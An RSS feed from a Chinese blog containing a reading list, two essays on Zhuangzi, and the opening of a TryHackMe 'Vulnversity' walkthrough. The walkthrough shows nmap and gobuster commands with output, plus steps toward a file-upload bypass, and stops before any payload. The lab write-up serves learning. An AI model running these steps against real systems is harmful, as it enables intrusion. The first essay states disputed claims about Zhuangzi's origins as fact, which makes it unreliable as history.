<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>XEYE</title>
    <link>https://xeye.io/</link>
    <description>Recent content on XEYE</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 01 Apr 2020 17:50:28 +0800</lastBuildDate>
    
        <atom:link href="https://xeye.io/index.xml" rel="self" type="application/rss+xml" />
    
    
    
        <item>
        <title>推荐书单</title>
        <link>https://xeye.io/posts/%E6%8E%A8%E8%8D%90%E4%B9%A6%E5%8D%95/</link>
        <pubDate>Mon, 29 Jun 2020 12:04:51 +0800</pubDate>
        
        <guid>https://xeye.io/posts/%E6%8E%A8%E8%8D%90%E4%B9%A6%E5%8D%95/</guid>
        <description>XEYE https://xeye.io/posts/%E6%8E%A8%E8%8D%90%E4%B9%A6%E5%8D%95/ -&lt;p&gt;推荐书单：&lt;/p&gt;
&lt;p&gt;一、易家大道根源书&lt;/p&gt;
&lt;p&gt;《河图》&lt;/p&gt;
&lt;p&gt;《洛书》&lt;/p&gt;
&lt;p&gt;《易经》&lt;/p&gt;
&lt;p&gt;二、黄老庄道家三圣书之至道四经&lt;/p&gt;
&lt;p&gt;《黄帝内经》&lt;/p&gt;
&lt;p&gt;《黄帝阴符经》&lt;/p&gt;
&lt;p&gt;《道德经》&lt;/p&gt;
&lt;p&gt;《庄子》&lt;/p&gt;
&lt;p&gt;三、孔孟荀儒家三圣书&lt;/p&gt;
&lt;p&gt;《论语》&lt;/p&gt;
&lt;p&gt;《易传》&lt;/p&gt;
&lt;p&gt;《春秋》&lt;/p&gt;
&lt;p&gt;《诗经》&lt;/p&gt;
&lt;p&gt;《尚书》&lt;/p&gt;
&lt;p&gt;《孟子》&lt;/p&gt;
&lt;p&gt;《荀子》&lt;/p&gt;
&lt;p&gt;《礼记》&lt;/p&gt;
&lt;p&gt;四、管商韩法家三圣书&lt;/p&gt;
&lt;p&gt;《管子》&lt;/p&gt;
&lt;p&gt;《商君书》&lt;/p&gt;
&lt;p&gt;《韩非子》&lt;/p&gt;
&lt;p&gt;五、先秦诸圣书&lt;/p&gt;
&lt;p&gt;《素书》&lt;/p&gt;
&lt;p&gt;《列子》&lt;/p&gt;
&lt;p&gt;《黄帝四经》&lt;/p&gt;
&lt;p&gt;《吕氏春秋》&lt;/p&gt;
&lt;p&gt;《鬼谷子》&lt;/p&gt;
&lt;p&gt;《鬼谷子阴符本经七术》&lt;/p&gt;
&lt;p&gt;《楚辞》&lt;/p&gt;
&lt;p&gt;《离骚》&lt;/p&gt;
&lt;p&gt;《汤液经法》&lt;/p&gt;
&lt;p&gt;六、中医四大经典&lt;/p&gt;
&lt;p&gt;《黄帝内经》&lt;/p&gt;
&lt;p&gt;《难经》&lt;/p&gt;
&lt;p&gt;《伤寒杂病论》&lt;/p&gt;
&lt;p&gt;《神农本草经》&lt;/p&gt;
&lt;p&gt;七、兵家之武经七书&lt;/p&gt;
&lt;p&gt;《孙子兵法》&lt;/p&gt;
&lt;p&gt;《吴子兵法》&lt;/p&gt;
&lt;p&gt;《六韬》&lt;/p&gt;
&lt;p&gt;《司马法》&lt;/p&gt;
&lt;p&gt;《三略》&lt;/p&gt;
&lt;p&gt;《尉缭子》&lt;/p&gt;
&lt;p&gt;《李卫公问对》&lt;/p&gt;
&lt;p&gt;八、春秋三传&lt;/p&gt;
&lt;p&gt;《春秋左传》&lt;/p&gt;
&lt;p&gt;《春秋公羊传》&lt;/p&gt;
&lt;p&gt;《春秋谷梁传》&lt;/p&gt;
&lt;p&gt;九、史家绝唱书&lt;/p&gt;
&lt;p&gt;《史记》&lt;/p&gt;
&lt;p&gt;《汉书》&lt;/p&gt;
&lt;p&gt;《后汉书》&lt;/p&gt;
&lt;p&gt;《资治通鉴》&lt;/p&gt;
&lt;p&gt;十、华夏诸圣贤书&lt;/p&gt;
&lt;p&gt;《新语》&lt;/p&gt;
&lt;p&gt;《谏迎佛骨表》&lt;/p&gt;
&lt;p&gt;《太极图》&lt;/p&gt;
&lt;p&gt;《指玄篇》&lt;/p&gt;
&lt;p&gt;《无极图》&lt;/p&gt;
&lt;p&gt;《张载集》&lt;/p&gt;
&lt;p&gt;《朱子语类》&lt;/p&gt;
&lt;p&gt;《周易外传》&lt;/p&gt;
&lt;p&gt;《黄书》&lt;/p&gt;
&lt;p&gt;《尚书引义》&lt;/p&gt;
&lt;p&gt;《永历实录》&lt;/p&gt;
&lt;p&gt;《春秋世论》&lt;/p&gt;
&lt;p&gt;《噩梦》&lt;/p&gt;
&lt;p&gt;《宋论》&lt;/p&gt;
&lt;p&gt;《中国人的精神》&lt;/p&gt;
&lt;p&gt;《毛泽东选集》&lt;/p&gt;
&lt;p&gt;十一、明察之书&lt;/p&gt;
&lt;p&gt;范文澜《中国通史》&lt;/p&gt;
&lt;p&gt;徐大椿《医学源流论》&lt;/p&gt;
&lt;p&gt;戚本禹《戚本禹回忆录》&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;外国书籍&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;尼采&lt;/p&gt;
&lt;p&gt;《悲剧的诞生》《不合时宜的考察》《人性的，太人性的》《漫游者和他的影子》《曙&lt;/p&gt;
&lt;p&gt;光》《快乐的知识》《重估一切价值》《查拉斯图拉如是说》《善恶的彼岸》《道德的谱系》《权力意志》《偶像的黄昏》《看哪，这个人》&lt;/p&gt;
&lt;p&gt;马克思&lt;/p&gt;
&lt;p&gt;《德意志意识形态》《共产党宣言》《资本论》《哲学的贫困》&lt;/p&gt;
&lt;p&gt;弗洛伊德&lt;/p&gt;
&lt;p&gt;《梦的解析》《图腾与禁忌》《弗洛伊德自传》&lt;/p&gt;
&lt;p&gt;胡塞尔&lt;/p&gt;
&lt;p&gt;《现象学方法》《生活世界现象学》《欧洲科学的危机与超越论的现象学》&lt;/p&gt;
&lt;p&gt;海德格尔&lt;/p&gt;
&lt;p&gt;《存在与时间》《林中路》《尼采》&lt;/p&gt;
&lt;p&gt;雅斯贝尔斯&lt;/p&gt;
&lt;p&gt;《苏格拉底、佛陀、孔子和耶稣》《大哲学家》《悲剧的超越》&lt;/p&gt;
&lt;p&gt;德里达&lt;/p&gt;
&lt;p&gt;《马克思的幽灵》《德里达中国讲演录》《解构》&lt;/p&gt;
&lt;p&gt;福柯&lt;/p&gt;
&lt;p&gt;《词与物》《临床医学的诞生》《癫狂与文明》&lt;/p&gt;
&lt;p&gt;德勒茲&lt;/p&gt;
&lt;p&gt;《千块高原》《反俄狄浦斯》《尼采与哲学》《德勒兹论福柯》&lt;/p&gt;
&lt;p&gt;巴塔耶&lt;/p&gt;
&lt;p&gt;《色情史》《色情、耗费与普遍经济》《文学与恶》《爱华妲夫人及其它》&lt;/p&gt;
&lt;p&gt;布朗肖&lt;/p&gt;
&lt;p&gt;《文学空间》《从卡夫卡到卡夫卡》《变异的思想》《最后之人》《等待，遗忘》《那没有伴着我的一个》《黑暗托马》《死刑判决》&lt;/p&gt;
&lt;p&gt;马尔库塞&lt;/p&gt;
&lt;p&gt;《单向度的人》《爱欲与文明》&lt;/p&gt;
&lt;p&gt;本雅明&lt;/p&gt;
&lt;p&gt;《单行道》《迎向灵光消逝的年代》《发达资本主义时代的抒情诗人》《机械复制时代的艺术作品》《经验与贫乏》&lt;/p&gt;
&lt;p&gt;弗洛姆&lt;/p&gt;
&lt;p&gt;《健全的社会》《逃避自由》《爱的艺术》《人类的破坏性剖析》&lt;/p&gt;
&lt;p&gt;哈贝马斯&lt;/p&gt;
&lt;p&gt;《合法性危机》《包容他者》《后形而上学思想》《恐怖时代的哲学》&lt;/p&gt;
&lt;p&gt;荣格&lt;/p&gt;
&lt;p&gt;《寻求灵魂的现代人》《现代灵魂的自我拯救》《让我们重返精神的家园》《人类及其象征》《荣格自传》《原型与集体无意识》《荣格文集》《未发现的自我》《心理学与文学》&lt;/p&gt;
&lt;p&gt;拉康&lt;/p&gt;
&lt;p&gt;《镜像阶段》《阅读你的症状》《拉康选集》&lt;/p&gt;
&lt;p&gt;维特根斯坦&lt;/p&gt;
&lt;p&gt;《逻辑哲学导论》《论确定性》《哲学研究》《哲学语法》《战时笔记》《文化的价值》《数学基础研究》《关于心理学的最后著作》&lt;/p&gt;
&lt;p&gt;泰勒&lt;/p&gt;
&lt;p&gt;《自我的根源》&lt;/p&gt;
&lt;p&gt;卡夫卡&lt;/p&gt;
&lt;p&gt;《变形记》《城堡》《审判》《卡夫卡散文》《审判》《美国》&lt;/p&gt;
&lt;p&gt;贝克特&lt;/p&gt;
&lt;p&gt;《镇定剂》《等待戈多》《世界与裤子》《无法称呼的人》&lt;/p&gt;
&lt;p&gt;穆奇尔&lt;/p&gt;
&lt;p&gt;《没有个性的人》《穆奇尔散文集》&lt;/p&gt;
&lt;p&gt;普鲁斯特&lt;/p&gt;
&lt;p&gt;《追忆似水年华》&lt;/p&gt;
&lt;p&gt;加缪&lt;/p&gt;
&lt;p&gt;《局外人》《异乡人》《西西弗斯的神话》《鼠疫》&lt;/p&gt;
&lt;p&gt;乔伊斯&lt;/p&gt;
&lt;p&gt;《尤利西斯》&lt;/p&gt;
&lt;p&gt;马尔克斯&lt;/p&gt;
&lt;p&gt;《百年孤独》《霍乱时期的爱情》&lt;/p&gt;
&lt;p&gt;博尔赫斯&lt;/p&gt;
&lt;p&gt;《小径分叉的花园》《红色的旋律》《面前的月亮》《深沉的玫瑰》《梦之书》《沙之书》《虚构集》&lt;/p&gt;
&lt;p&gt;品钦&lt;/p&gt;
&lt;p&gt;《万有引力之虹》&lt;/p&gt;
&lt;p&gt;黑塞&lt;/p&gt;
&lt;p&gt;《纳尔齐斯与歌尔德蒙》《荒原狼》《东方之旅》《玻璃球游戏》&lt;/p&gt;
&lt;p&gt;契诃夫&lt;/p&gt;
&lt;p&gt;《第六病室》&lt;/p&gt;
&lt;p&gt;托尔斯泰&lt;/p&gt;
&lt;p&gt;《安娜·卡列尼娜》《战争与和平》《复活》&lt;/p&gt;
&lt;p&gt;陀思妥耶夫斯基&lt;/p&gt;
&lt;p&gt;《死屋手记》《卡拉马佐夫兄弟》《罪与罚》《被侮辱的与被损害的》&lt;/p&gt;
&lt;p&gt;布尔加科夫&lt;/p&gt;
&lt;p&gt;《大师与玛格丽特》&lt;/p&gt;
&lt;p&gt;劳伦斯&lt;/p&gt;
&lt;p&gt;《卡泰莱夫人的情人》《劳伦斯散文集》《不是我，而是风》&lt;/p&gt;
&lt;p&gt;亨利·米勒&lt;/p&gt;
&lt;p&gt;《北回归线》《黑色的春天》《马洛西的大石像》&lt;/p&gt;
&lt;p&gt;纳博科夫&lt;/p&gt;
&lt;p&gt;《洛丽塔》《微暗的火》《斩首之邀》&lt;/p&gt;
&lt;p&gt;昆德拉&lt;/p&gt;
&lt;p&gt;《告别圆舞曲》《好笑的爱》《不能承受的生命之轻》《不朽》《身份》《笑忘录》&lt;/p&gt;
&lt;p&gt;波德莱尔&lt;/p&gt;
&lt;p&gt;《异乡人》《恶之花》《巴黎的忧郁》&lt;/p&gt;
&lt;p&gt;兰波&lt;/p&gt;
&lt;p&gt;《彩画集》《醉舟》《地狱一季》《全蚀狂爱》（电影）《兰波作品集》&lt;/p&gt;
&lt;p&gt;里尔克&lt;/p&gt;
&lt;p&gt;《杜伊诺哀歌》《献给奥尔甫斯的十四行诗》《里尔克诗选》&lt;/p&gt;
&lt;p&gt;荷尔德林&lt;/p&gt;
&lt;p&gt;《荷尔德林诗选》&lt;/p&gt;
&lt;p&gt;保罗·策兰&lt;/p&gt;
&lt;p&gt;《保罗·策兰诗选》&lt;/p&gt;
&lt;p&gt;麦克卢汉&lt;/p&gt;
&lt;p&gt;《理解媒介》《机器新娘》《谷登堡星汉璀璨》《麦克卢汉如是说》&lt;/p&gt;
&lt;p&gt;鲍德里亚&lt;/p&gt;
&lt;p&gt;《媒介的挽歌》《生产之镜》《消费社会》《生产之镜》《完美的罪行》《物的体系》《幻觉的终结》《拟像与模拟》《象征性消费与死亡》《美国》&lt;/p&gt;
&lt;p&gt;施特劳斯&lt;/p&gt;
&lt;p&gt;《忧郁的热带》《新结构人类学》《野性的思维》《种族与历史》&lt;/p&gt;
&lt;p&gt;罗蒂&lt;/p&gt;
&lt;p&gt;《偶然》&lt;/p&gt;
- https://xeye.io/posts/%E6%8E%A8%E8%8D%90%E4%B9%A6%E5%8D%95/ - </description>
        </item>
    
    
    
        <item>
        <title>推荐书单</title>
        <link>https://xeye.io/post/%E6%8E%A8%E8%8D%90%E4%B9%A6%E5%8D%95/</link>
        <pubDate>Mon, 29 Jun 2020 12:01:30 +0800</pubDate>
        
        <guid>https://xeye.io/post/%E6%8E%A8%E8%8D%90%E4%B9%A6%E5%8D%95/</guid>
        <description>XEYE https://xeye.io/post/%E6%8E%A8%E8%8D%90%E4%B9%A6%E5%8D%95/ -- https://xeye.io/post/%E6%8E%A8%E8%8D%90%E4%B9%A6%E5%8D%95/ - </description>
        </item>
    
    
    
        <item>
        <title>闲话庄子：一、庄子其人</title>
        <link>https://xeye.io/posts/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%B8%80%E5%BA%84%E5%AD%90%E5%85%B6%E4%BA%BA/</link>
        <pubDate>Tue, 07 Apr 2020 17:19:43 +0800</pubDate>
        
        <guid>https://xeye.io/posts/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%B8%80%E5%BA%84%E5%AD%90%E5%85%B6%E4%BA%BA/</guid>
        <description>XEYE https://xeye.io/posts/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%B8%80%E5%BA%84%E5%AD%90%E5%85%B6%E4%BA%BA/ -&lt;blockquote&gt;
&lt;p&gt;有人看了《庄子》，就认为庄子是书里描写的那样，是个吃米都得找人借的穷光蛋。认为他出身卑微，一生穷困潦倒，实际上并不是这样。那只是书里面写的寓言，不能把寓言当现实。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 id=&#34;庄子是个什么样的人&#34;&gt;&lt;strong&gt;庄子是个什么样的人？&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;庄子是楚国人，居住在楚国蒙地，蒙地就是今天的安徽蒙城县。庄子曾经的职业是做蒙地的漆园吏。有人说庄子是宋国人，这是毫无根据的结论。首先，宋国不是当时的学术中心，不具备产生圣人的文化土壤。其次，宋国的漆器根本不发达，没有产业的驱动，不可能产生庞大的原材料生产基地。&lt;/p&gt;
&lt;p&gt;再次，宋国是商朝遗民，在周朝，宋人一直备受天下人讥讽，只有宋人不讥讽自己。庄子在书里，对宋人的讥讽十分辛辣，显然庄子不会是宋人。那时候如果要讲一个傻子的故事，通常开篇都是说，从前有个宋人。&lt;/p&gt;
&lt;p&gt;以此三点来反观楚国，更能说明庄子是楚国人，而不是宋人。首先，楚国是当时的文化和学术中心。不仅产生了庄子这样的圣人，还产生了老子和屈原这样的大圣人。其次，楚国的漆器艺术和产业是当时最发达和繁荣的，所以才有很多的漆园。再次，庄子对楚国是充满褒扬之心的。庄子在逍遥游开篇就讲图南之志，这就是楚国文化所特有的对凤凰的崇拜。中原文化，更多的是崇拜龙。&lt;/p&gt;
&lt;p&gt;对庄子的另一个误解是，认为漆园吏是一个微不足道的小官。实际上，漆器是楚国的战略产业，是当时天下最名贵最高端的奢饰品。它既代表了当时艺术审美的巅峰，也是楚国皇家御用品，同时还是楚国出口的支柱产品。所以说，漆园吏非但不是无足轻重的小官，还是掌管楚国战略资源的重要官员。&lt;/p&gt;
&lt;p&gt;为什么这么重要的职位，会让庄子来负责呢？因为庄子是楚国贵族，和楚国国君是亲戚。庄子是楚庄王的后人，庄子的姓氏，就来自楚庄王的谥号庄字。以祖上的谥号为姓氏，庄姓的源头就出自楚国。有人看了《庄子》，就认为庄子是书里描写的那样，是个吃米都得找人借的穷光蛋。认为他出身卑微，一生穷困潦倒，实际上并不是这样。那只是书里面写的寓言，不能把寓言当现实。&lt;/p&gt;
&lt;p&gt;看到这里，是不是很多人觉得有些诧异，楚人不是蛮夷吗？怎么会成为当时的学术和文化中心呢？实际上，楚人非但不是蛮夷，还是三皇时期就根正苗红的中原华夏族人。华夏族是汉族在汉朝之前的称谓。商代夏之后，商人把楚人从中原驱逐了出去。还蔑称楚人是蛮夷。后来周代商，赶走了商人，楚人也是武王伐纣的盟友之一。立了功的楚人觉得，自己终于可以回归中原了。但是周人并没有把楚人封在中原，而是视楚人为蛮夷，怠慢了楚人。&lt;/p&gt;
&lt;p&gt;周王室没有把楚人迁回中原，只给楚国封了一个子爵，这是当时所有诸侯国里面最低级的一个爵位，封地也只有五十平方公里，这就是楚国最开始的建国基础。后来楚国人一直奋发图强，就是为了能提高自己的尊位。到了楚武王的时候，楚武王攻打随国。大家都很愤怒，因为依据周礼，不可攻伐无罪之国。楚武王之所以这么做，就是为了让周天子能够提高自己的爵位。但是周王室拒绝了楚国。愤怒的楚武王发出了震惊天下的一句话：“王不加位，我自尊耳。”&lt;/p&gt;
&lt;p&gt;楚武王，把自己的三个儿子都封了王，这样楚和周成了并立的两个王朝。自立为王是楚国命运的一个大转折点。周王室内乱，王子朝奔楚，则是楚国文化和学术兴盛，并使楚国成为文化中心的重大的转折点。&lt;/p&gt;
&lt;p&gt;综上可见，当年楚人南奔，保留下来了很多上古三皇时期的文化火种。从老庄的书里，可以看出来浓厚的三皇之学的底蕴。周朝官学的长期辐射和影响，使得楚国的文化学术逐步繁荣，老子做周王室史官，得以学习继承古圣之道。王子朝携带周室典籍奔楚后，楚国便成为当时的天下文化和学术中心。这便是老庄之道的源流和传承。&lt;/p&gt;
- https://xeye.io/posts/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%B8%80%E5%BA%84%E5%AD%90%E5%85%B6%E4%BA%BA/ - </description>
        </item>
    
    
    
        <item>
        <title>闲话庄子：二、庄子的生死观</title>
        <link>https://xeye.io/posts/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%BA%8C%E5%BA%84%E5%AD%90%E7%9A%84%E7%94%9F%E6%AD%BB%E8%A7%82/</link>
        <pubDate>Tue, 07 Apr 2020 16:43:33 +0800</pubDate>
        
        <guid>https://xeye.io/posts/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%BA%8C%E5%BA%84%E5%AD%90%E7%9A%84%E7%94%9F%E6%AD%BB%E8%A7%82/</guid>
        <description>XEYE https://xeye.io/posts/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%BA%8C%E5%BA%84%E5%AD%90%E7%9A%84%E7%94%9F%E6%AD%BB%E8%A7%82/ -&lt;p&gt;在庄子看来，生，只是一段插曲。&lt;/p&gt;
&lt;p&gt;你来自于无，又归于无。死亡，就像是回家。所以，有视死如归之说。和漫长的虚无相比，生就是一次微不足道的火花，转瞬即逝。&lt;/p&gt;
&lt;p&gt;等你死后，回到家里。回想起你生着的那段时间，感觉仿佛是被人从家里扔了出去一样。如同你现在认为，死亡会把你的生命抛出去一样。&lt;/p&gt;
&lt;p&gt;对于死亡的恐惧，只是归乡情怯。把虚无理解为死亡，是不美好的。它生了你，又回收你，其实它就是你本来的样子。只是你不知道。&lt;/p&gt;
&lt;p&gt;庄子的妻子死后，庄子鼓盆而歌，并不是因为庄子神经病，而是他&lt;strong&gt;视死如归&lt;/strong&gt;。
那么庄子的高度到底如何呢，庄子达到的高度就是《庄子•天下篇》中描述的那样&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“上与造物者游，而下与外生死无终始者为友。独与天地精神相往来”。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;与造物主牵着手一起看夕阳，这大概就是道家的终极追求了。&lt;/p&gt;
- https://xeye.io/posts/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%BA%8C%E5%BA%84%E5%AD%90%E7%9A%84%E7%94%9F%E6%AD%BB%E8%A7%82/ - </description>
        </item>
    
    
    
        <item>
        <title>靶机渗透测试 TryHackMe:Vulnversity</title>
        <link>https://xeye.io/posts/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95tryhackme-vulnversity/</link>
        <pubDate>Fri, 03 Apr 2020 16:20:51 +0800</pubDate>
        
        <guid>https://xeye.io/posts/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95tryhackme-vulnversity/</guid>
        <description>XEYE https://xeye.io/posts/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95tryhackme-vulnversity/ -&lt;p&gt;&lt;strong&gt;0x00 前言&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;靶机名称：Vulnversity&lt;/li&gt;
&lt;li&gt;靶机简介：Vulnversity靶机主要学习主动侦查扫描，Web应用攻击和suid提权。&lt;/li&gt;
&lt;li&gt;攻击路径：端口扫描&amp;ndash;&amp;gt;Web目录爆破&amp;ndash;&amp;gt;文件上传漏洞利用&amp;ndash;&amp;gt;权限提升&lt;/li&gt;
&lt;li&gt;相关工具：nmap、gobuster、burpsuite、nc、webshell&lt;/li&gt;
&lt;li&gt;难度：容易&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;0x01 侦查&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.nmap 扫描&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -sV -sC -T4 -A 10.10.137.247 -oA 10.10.137.247.nmap

☁  vulnversity  nmap -sV -sC -T4 -A 10.10.137.247 -oA 10.10.137.247.nmap             
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-19 19:39 CST
Nmap scan report for 10.10.137.247
Host is up (0.26s latency).
Not shown: 972 closed ports
PORT      STATE    SERVICE           VERSION
21/tcp    open     ftp               vsftpd 3.0.3
22/tcp    open     ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp   open     netbios-ssn       Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
163/tcp   filtered cmip-man
445/tcp   open     netbios-ssn       Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
625/tcp   filtered apple-xsrvr-admin
1001/tcp  filtered webpush
1070/tcp  filtered gmrupdateserv
1147/tcp  filtered capioverlan
3128/tcp  open     http-proxy        Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp  open     http              Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
3871/tcp  filtered avocent-adsap
3878/tcp  filtered fotogcad
4449/tcp  filtered privatewire
5225/tcp  filtered hp-server
6106/tcp  filtered isdninfo
7002/tcp  filtered afs3-prserver
8181/tcp  filtered intermapper
8193/tcp  filtered sophos
8652/tcp  filtered unknown
9502/tcp  filtered unknown
10012/tcp filtered unknown
14441/tcp filtered unknown
15002/tcp filtered onep-tls
15003/tcp filtered unknown                                                                                                                                                                                                                 
27352/tcp filtered unknown                                                                                                                                                                                                                 
49155/tcp filtered unknown                                                                                                                                                                                                                 
64623/tcp filtered unknown                                                                                                                                                                                                                 
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                                                                                                        
TCP/IP fingerprint:                                                                                                                                                                                                                        
OS:SCAN(V=7.80%E=4%D=3/19%OT=21%CT=1%CU=32906%PV=Y%DS=2%DC=T%G=Y%TM=5E735A2                                                                                                                                                                
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(                                                                                                                                                                
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11                                                                                                                                                                
OS:NW7%O6=M54DST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(                                                                                                                                                                
OS:R=Y%DF=Y%T=40%W=6903%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS                                                                                                                                                                
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=                                                                                                                                                                
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=                                                                                                                                                                
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T                                                                                                                                                                
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=                                                                                                                                                                
OS:S)                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                           
Network Distance: 2 hops                                                                                                                                                                                                                   
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                       
                                                                                                                                                                                                                                           
Host script results:                                                                                                                                                                                                                       
|_clock-skew: mean: 1h20m22s, deviation: 2h18m34s, median: 21s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-03-19T07:40:44-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-19T11:40:44
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   539.50 ms 10.9.0.1
2   539.58 ms 10.10.137.247

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.95 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;2. 查看端口开放服务和数量&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;grep &amp;quot;open&amp;quot; 10.10.137.247.nmap.nmap
21/tcp    open     ftp               vsftpd 3.0.3
22/tcp    open     ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp   open     netbios-ssn       Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn       Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp  open     http-proxy        Squid http proxy 3.5.12
3333/tcp  open     http              Apache httpd 2.4.18 ((Ubuntu))

grep &amp;quot;open&amp;quot; 10.10.137.247.nmap.nmap |wc -l
6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;0x02 Web目录爆破&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;obuster项目地址：https://github.com/OJ/gobuster
gobuster dir -u http://10.10.137.247:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现上传页面&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://10.10.137.247:3333/internal/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397430-c9cfe780-7623-11ea-97b4-eeda9f020c25.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397430-c9cfe780-7623-11ea-97b4-eeda9f020c25.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397469-d7856d00-7623-11ea-8458-b4928f60e1a2.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397469-d7856d00-7623-11ea-8458-b4928f60e1a2.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0x03 穷举上传文件扩展名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397548-03085780-7624-11ea-843e-4af58c7ac5be.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397548-03085780-7624-11ea-843e-4af58c7ac5be.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397689-3e0a8b00-7624-11ea-8f46-004de1cf9b54.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397689-3e0a8b00-7624-11ea-8f46-004de1cf9b54.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;设置Content-Type类型为php&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Content-Type: application/x-php
